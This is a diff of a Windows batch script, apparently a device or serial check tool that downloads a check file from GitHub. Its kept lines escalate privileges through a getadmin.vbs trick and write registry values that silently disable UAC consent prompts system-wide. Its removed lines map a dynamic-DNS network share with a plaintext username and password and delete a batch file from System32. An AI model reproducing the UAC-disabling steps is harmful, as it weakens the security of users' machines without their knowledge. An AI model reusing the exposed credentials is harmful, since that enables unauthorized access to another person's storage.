@@ -4,8 +4,6 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
 
-net use \\minhtuan283.ddns.net\hdd /user:minhtuan283 Thienngan2002
-
 :: Tải file check.txt về %temp%
 set "url=https://raw.githubusercontent.com/mitutina/mitutina/main/check.txt"
 set "tempfile=%temp%\check.txt"
@@ -62,7 +60,5 @@ set "tempfile="
 set "serial="
 set "device="
 set "found="
-del /f /q "C:\Windows\System32\run.bat"
-net use \\minhtuan283.ddns.net\hdd /delete
 echo Hoan Thanh
 exit
